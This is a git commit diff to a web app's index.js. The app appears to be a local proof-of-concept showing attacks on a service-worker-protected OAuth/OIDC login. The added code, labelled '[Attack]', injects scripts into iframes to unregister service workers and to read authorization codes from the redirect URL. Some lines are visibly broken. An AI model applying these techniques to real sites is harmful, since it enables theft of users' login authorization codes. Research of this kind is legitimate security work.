fe8cbb0e66cccdaac5356ba1b141dc3936982d22
cghislai <charlyghislain@gmail.com>
2023-09-04 22:31:00 +0200

    fiddling

--- web/src/index.js
+++ web/src/index.js
@@ -13,8 +13,10 @@ const registerServiceWorker = async () => {
         const registration = await navigator.serviceWorker.register('service-worker.js');
         if (registration.installing) {
             console.log("[I] Service worker installing");
+            document.location.reload();
         } else if (registration.waiting) {
-            console.log("[I] Service worker installed");
+            console.log("[I] Service worker waiting");
+            document.location.reload();
         } else if (registration.active) {
             console.log("[I] Service worker active");
         }
@@ -23,16 +25,19 @@ const registerServiceWorker = async () => {
     }
 };
 
-const startApplication = () => {
+const startApplication = async () => {
 
-    function createIframe(src, script) {
+    function createIframe(src, scriptFactory) {
         const iframe = document.createElement('iframe');
         iframe.setAttribute('src', src); // Initialize with an empty page
         iframe.setAttribute('width', '500');
         iframe.setAttribute('height', '300');
         document.body.appendChild(iframe);
 
-        iframe.addEventListener('load', function () {
+        const rand = (Math.random() + 1).toString(36).substring(7);
+        const scriptContent = scriptFactory(rand);
+
+        function injectScript() {
             // Access the iframe's document object
             const iframeDocument = iframe.contentDocument || iframe.contentWindow.document;
 
@@ -40,39 +45,60 @@ const startApplication = () => {
             const scriptElement = iframeDocument.createElement('script');
 
             // Set the script's content with your custom code
-            scriptElement.textContent = script;
+            scriptElement.textContent = scriptContent;
 
             // Append the script to the iframe's document
             iframeDocument.body.appendChild(scriptElement);
+        }
+
+        // injectScript();
+
+        iframe.addEventListener('load', function () {
+            injectScript();
         });
     }
 
-    createIframe('about:blank', `
+
+    createIframe(`${window.location.origin}/xxx.html#attack2`,
+        rand => `
             console.log('[Attack] Attack 2: trying to unregister service workers from iframe');
             navigator.serviceWorker.getRegistrations().then(registrations => {
-            for (const registration of registrations) {
-                console.log('[I] Service worker registration: ', registration);
+               for (const registration of registrations) {
+                    console.log('[I] Service worker registration: ', registration);
                     registration.unregister();
                 }
             });
+            document.href = 'http://localhost:7218/realms/swdemo/protocol/openid-connect/auth?client_id=swtest&response_type=code&scope=openid&redirect_uri=http://localhost:7280/xxx.html#attack2';
         `);
 
-    createIframe('http://localhost:7218/realms/swdemo/protocol/openid-connect/auth?client_id=swtest&response_type=code&scope=openid&redirect_uri=http://localhost:7280/xxx.html', `
-            const url = new URL(window.location.href);
-            const code = url.searchParams?.get('code');
-            console.log('[Attack] running in code stealing iframe, code: ', code);
-        `);
 
     console.log('[Attack] Attack 1: trying to unregister service workers');
-    navigator.serviceWorker.getRegistrations().then(registrations => {
-        for (const registration of registrations) {
+    await navigator.serviceWorker.getRegistrations().then(registrations => {
+        return Promise.all(registrations.map(registration => {
             console.log('[I] Service worker registration: ', registration);
-            registration.unregister();
-        }
+            return registration.unregister()
+                .then(() => console.log('[I] SW unregistered', registration))
+        }));
     });
+
+    createIframe('http://localhost:7218/realms/swdemo/protocol/openid-connect/auth?client_id=swtest&response_type=code&scope=openid&redirect_uri=http://localhost:7280/xxx.html',
+        rand => `
+                const url_${rand} = new URL(window.location.href);
+                const code_${rand} = url_${rand}.searchParams?.get('code');
+                console.log('[Attack] Attack 1: running in code stealing iframe, code: ', code_${rand});
+            `);
+
+    document.addEventListener('load', function () {
+        const url_ = new URL(window.location.href);
+        const code = url.searchParams?.get('code');
+        console.log('[Attack] Attack 3: running in main doc, code: ', code);
+    });
+    setTimeout(() => {
+        'http://localhost:7218/realms/swdemo/protocol/openid-connect/auth?client_id=swtest&response_type=code&scope=openid&redirect_uri=http://localhost:7280/xxx.html'
+    }, 1500);
 };
 
 document.addEventListener('DOMContentLoaded', function () {
     registerServiceWorker()
-        .then(startApplication());
+        .then(() => startApplication());
 });
